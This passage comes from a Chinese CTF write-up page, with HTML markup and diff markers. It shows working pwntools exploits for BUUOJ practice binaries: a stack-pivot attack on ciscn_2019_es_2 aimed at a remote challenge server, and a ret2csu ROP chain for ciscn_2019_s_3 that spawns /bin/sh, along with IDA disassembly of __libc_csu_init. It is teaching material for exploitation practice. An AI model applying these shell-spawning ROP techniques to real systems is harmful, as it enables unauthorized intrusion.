class="string">b&#x27;/bin/sh&#x27;</span>).ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">   <span class="comment"># fake ret_addr, true ret_addr </span></span><br><span class="line">   payload2 += p32(s) + p32(leave)</span><br><span class="line">   <span class="comment"># input_addr, leave_ret_rop</span></span><br><span class="line">   io.sendline(payload2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   <span class="comment">#io = process(&#x27;./ciscn_2019_es_2&#x27;)</span></span><br><span class="line">   io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25446</span>)</span><br><span class="line">   context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">   elf = ELF(<span class="string">&#x27;./ciscn_2019_es_2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">   sys_plt = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">   leave = <span class="number">0x080484b8</span></span><br><span class="line">   vul = <span class="number">0x8048595</span></span><br><span class="line"></span><br><span class="line">   input_addr = hijackebp()</span><br><span class="line">   exploit(input_addr)</span><br><span class="line">   </span><br><span class="line">   io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="ciscn-2019-s-3——ret2csu"><a href="#ciscn-2019-s-3——ret2csu" class="headerlink" title="ciscn_2019_s_3——ret2csu"></a>ciscn_2019_s_3——ret2csu</h2><p>本题的要点是执行<code>execve(&#39;/bin/sh&#39;,0,0)</code>这个函数，调用这个函数需要有<code>syscall</code>指令，并且需要满足<code>rax = 0x3b, rdi = &lt;bin_sh_addr&gt;, rsi = rdx = 0</code>这几个条件。</p>
+<p>可以从<code>ROPgadget</code>中得到<code>pop rdi</code>与<code>pop rsi</code>这几个gadget从而成功传参，<code>mov rax，3bh</code>也可以从<code>gadgets</code>函数附近得到。但是并没有任何直接的退栈指令涉及到<code>rdx</code>寄存器，而且程序中没有<code>/bin/sh</code>字符串，需要自行插入且找到它在栈中的地址。</p>
+<p>通过在IDA中寻找<code>rdx</code>字符串，可以找到唯一可能改变<code>rdx</code>值的指令在<code>__libc_csu_init</code>中，以下是其反汇编代码：</p>
+<h3 id="libc-csu-init-源码"><a href="#libc-csu-init-源码" class="headerlink" title="__libc_csu_init 源码"></a>__libc_csu_init 源码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400540                                   ; void _libc_csu_init(void)</span><br><span class="line">.text:0000000000400540                                   public __libc_csu_init</span><br><span class="line">.text:0000000000400540                                   __libc_csu_init proc near     ; DATA XREF: _start+16↑o</span><br><span class="line">.text:0000000000400540                                   ; __unwind &#123;</span><br><span class="line">.text:0000000000400540 000 41 57                         push    r15</span><br><span class="line">.text:0000000000400542 008 41 56                         push    r14</span><br><span class="line">.text:0000000000400544 010 41 89 FF                      mov     r15d, edi</span><br><span class="line">.text:0000000000400547 010 41 55                         push    r13</span><br><span class="line">.text:0000000000400549 018 41 54                         push    r12</span><br><span class="line">.text:000000000040054B 020 4C 8D 25 BE 08 20 00          lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:0000000000400552 020 55                            push    rbp</span><br><span class="line">.text:0000000000400553 028 48 8D 2D BE 08 20 00          lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:000000000040055A 028 53                            push    rbx</span><br><span class="line">.text:000000000040055B 030 49 89 F6                      mov     r14, rsi</span><br><span class="line">.text:000000000040055E 030 49 89 D5                      mov     r13, rdx</span><br><span class="line">.text:0000000000400561 030 4C 29 E5                      sub     rbp, r12</span><br><span class="line">.text:0000000000400564 030 48 83 EC 08                   sub     rsp, 8</span><br><span class="line">.text:0000000000400568 038 48 C1 FD 03                   sar     rbp, 3</span><br><span class="line">.text:000000000040056C 038 E8 1F FE FF FF                call    _init_proc</span><br><span class="line">.text:000000000040056C</span><br><span class="line">.text:0000000000400571 038 48 85 ED                      test    rbp, rbp</span><br><span class="line">.text:0000000000400574 038 74 20                         jz      short loc_400596</span><br><span class="line">.text:0000000000400574</span><br><span class="line">.text:0000000000400576 038 31 DB                         xor     ebx, ebx</span><br><span class="line">.text:0000000000400578 038 0F 1F 84 00 00 00 00 00       nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400578</span><br><span class="line">.text:0000000000400580</span><br><span class="line">.text:0000000000400580                                   loc_400580:                   ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000400580 038 4C 89 EA                      mov     rdx, r13</span><br><span class="line">.text:0000000000400583 038 4C 89 F6                      mov     rsi, r14</span><br><span class="line">.text:0000000000400586 038 44 89 FF                      mov     edi, r15d</span><br><span class="line">.text:0000000000400589 038 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]</span><br><span class="line">.text:0000000000400589</span><br><span class="line">.text:000000000040058D 038 48 83 C3 01                   add     rbx, 1</span><br><span class="line">.text:0000000000400591 038 48 39 EB                      cmp     rbx, rbp</span><br><span class="line">.text:0000000000400594 038 75 EA                         jnz     short loc_400580</span><br><span class="line">.text:0000000000400594</span><br><span class="line">.text:0000000000400596</span><br><span class="line">.text:0000000000400596                                   loc_400596:                   ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000400596 038 48 83 C4 08                   add     rsp, 8</span><br><span class="line">.text:000000000040059A 030 5B                            pop     rbx</span><br><span class="line">.text:000000000040059B 028 5D                            pop     rbp</span><br><span class="line">.text:000000000040059C 020 41 5C                         pop     r12</span><br><span class="line">.text:000000000040059E 018 41 5D                         pop     r13</span><br><span class="line">.text:00000000004005A0 010 41 5E                         pop     r14</span><br><span class="line">.text:00000000004005A2 008 41 5F                         pop     r15</span><br><span class="line">.text:00000000004005A4 000 C3                            retn</span><br><span class="line">.text:00000000004005A4                                   ; &#125; // starts at 400540</span><br><span class="line">.text:00000000004005A4</span><br><span class="line">.text:00000000004005A4                                   __libc_csu_init endp</span><br></pre></td></tr></table></figure>
+<p>我们的目标是<code>mov rdx, r13</code>这个指令，因为<code>r13</code>在退栈序列当中，因此可以插入<code>pop_6</code>这个gadget，然后跟上6个地址。其中<code>r13, r14</code>就必须置0，以对应接下来到<code>chg_rdx</code>的跳转。</p>
+<p>接着是<code>call [r12+rbx*8]</code>的问题，理论上说，这个指令可以实现任意地址的跳转，这里我选择直接跳到下一个指令（其实可以完全跳到下一个gadget），因此可以设<code>[r12] = 0x40058d, rbx = 0</code>。</p>
+<p>如何得到<code>r12</code>的值呢？可以肯定它跟输入地址存在固定的偏移。可以通过编写一个gadget指向其本身的payload来额外打印当前栈的信息。我将<code>/bin/sh</code>字符串设在了输入的位置，输入位置与<code>input_addr+0x20</code>处值的偏移可以通过动调得到（在远程做的时候这个偏移与本地可能不同，但相差不大，慢慢试就行）。</p>
+<p>为了避免<code>0x400594</code>处的循环，应当设置<code>rbx + 1 == rbp</code>，这里我选择令<code>rbp = 1</code>，然后再随便传6个地址出栈。</p>
+<p>由于<code>mov edi, r15d</code>会将<code>rdi</code>的高位置零，故需要再次设置一个<code>pop_rdi</code>的payload。最后调用<code>syscall</code>即可。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">eax_59 = <span class="number">0x4004e2</span> <span class="comment"># rax = 0x3b</span></span><br><span class="line">get_sys = <span class="number">0x400517</span></span><br><span class="line">pop_rdi = <span class="number">0x4005a3</span></span><br><span class="line">vuln = <span class="number">0x4004ed</span></span><br><span class="line">pop_6 = <span class="number">0x40059a</span></span><br><span class="line">chg_rdx = <span class="number">0x400580</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">rax = 59</span></span><br><span class="line"><span class="string">execve(&#x27;/bin/sh&#x27;,0,0); rdi,rsi,rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">offset = 0x128</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">   payload0 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span> + p64(vuln)</span><br><span class="line">   io.send(payload0)</span><br><span class="line">   input_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x118</span> <span class="comment"># in local it&#x27;s 0x128</span></span><br><span class="line">   log.success(<span class="string">&#x27;input_addr==&gt;&#x27;</span>+<span class="built_in">hex</span>(input_addr))</span><br><span class="line"></span><br><span class="line">   payload1 = <span class="string">b&#x27;/bin/sh\0&#x27;</span> + p64(<span class="number">0x40058d</span>) + p64(eax_59)</span><br><span class="line">   <span class="comment">#payload1 += p64(pop_r15) + p64(pop_r15) + p64(get_sys)</span></span><br><span class="line">   <span class="comment">#mov rdi=inputaddr, rsi=0, rdx=0</span></span><br><span class="line">   payload1 += p64(pop_6) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(input_addr+<span class="number">8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) </span><br><span class="line">   payload1 += p64(chg_rdx) + p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">   payload1 += p64(pop_rdi) + p64(input_addr)</span><br><span class="line">   payload1 += p64(get_sys)</span><br><span class="line"></span><br><span class="line">   io.send(payload1)</span><br></pre></td></tr></table></figure>
 <h1 id="other"><a href="#other" class="headerlink" title="other"></a>other</h1><h2 id="buu-re-rsa"><a href="#buu-re-rsa" class="headerlink" title="buu-re: rsa"></a>buu-re: rsa</h2><p><del>真不知道这道题为什么要放在re里面。</del></p>
 <p>已知公钥pub.key和密文flag.enc，而且公钥较小可暴力分解p、q。</p>
 <ol>
